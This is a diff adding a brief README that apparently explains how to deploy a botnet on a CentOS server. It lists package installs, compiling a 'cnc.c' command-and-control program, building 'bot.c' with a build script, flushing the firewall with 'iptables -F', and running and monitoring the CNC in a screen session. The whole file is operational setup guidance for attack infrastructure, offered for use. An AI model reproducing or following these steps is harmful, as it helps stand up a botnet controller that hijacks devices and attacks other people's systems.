@@ -1,0 +1,21 @@
+Server has to be centos 6/7 (7 is recommended 6 has errors cause servers are outdated.)
+
+1. yum update -y
+2. yum install python python-paramiko gcc nano nc screen psmisc bzip2 wget -y
+3. gcc cnc.c -o cnc -pthread
+4. python build.py bot.c
+5. iptables -F
+6. screen ./cnc BOT-PORT THREAD (Recommend 1-5) CNC-PORT
+7. CRTL + AD (dont have to do this if your wanting to moniter the cnc)
+
+(Your gonna have to change some of this depending on file names!)
+
+- cnc.c to cnc file name
+- bot.c to bot file name
+- build.py to net build file name
+
+
+Extra:
+
+instead of using nano to edit logins into a file just open the .txt file its more simple.
+to view whats happening after leaving the screen type screen -rx and to leave do CRTL + AD
